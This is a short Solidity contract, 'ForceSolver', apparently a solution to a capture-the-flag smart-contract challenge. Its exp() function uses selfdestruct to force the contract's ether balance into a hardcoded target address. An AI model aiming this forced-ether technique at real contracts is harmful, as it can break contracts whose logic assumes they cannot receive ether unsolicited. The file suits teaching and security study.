pragma solidity ^0.8.0;

contract ForceSolver {
    
    function exp() external {
        selfdestruct(payable(0x7EfcA24cAD796634dC9A74f393DDDc99A8789716));
    }

    receive() external payable {}
}